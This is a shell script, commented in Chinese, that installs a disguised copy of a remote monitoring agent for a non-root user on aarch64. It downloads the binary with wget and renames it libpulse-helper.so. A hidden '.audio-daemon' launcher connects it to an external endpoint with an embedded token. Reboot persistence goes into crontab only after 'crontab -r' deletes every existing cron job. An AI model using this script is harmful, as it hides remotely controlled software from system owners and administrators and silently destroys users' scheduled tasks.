#!/bin/sh
#
# 普通用户安装 (aarch64) - 伪装版
#

# ============ 配置（伪装名称）============
AGENT_URL="https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64"
AGENT_PATH="$HOME/.local/lib/libpulse-helper.so"
STARTUP_SCRIPT="$HOME/.local/lib/.audio-daemon"
ENDPOINT="https://status.sm.uy"
TOKEN="yrushkwQRMduYX7lU2eYyxa3"
# =========================================

mkdir -p "$HOME/.local/lib"

# 下载
[ ! -f "$AGENT_PATH" ] && wget -q "$AGENT_URL" -O "$AGENT_PATH" && chmod +x "$AGENT_PATH"

# 创建启动脚本（伪装 + 自动下载）
cat > "$STARTUP_SCRIPT" << EOF
#!/bin/sh
B="$AGENT_PATH"
U="$AGENT_URL"
[ ! -f "\$B" ] && wget -q "\$U" -O "\$B" && chmod +x "\$B"
"\$B" -e $ENDPOINT --auto-discovery "$TOKEN" -u > /dev/null 2>&1 &
EOF
chmod +x "$STARTUP_SCRIPT"

# crontab 持久化
crontab -r 2>/dev/null
echo "@reboot $STARTUP_SCRIPT" | crontab -

# 立即启动
pkill -f libpulse-helper 2>/dev/null
"$STARTUP_SCRIPT"
sleep 2
ps | grep -v grep | grep libpulse-helper && echo "[OK]" || echo "[FAIL]"
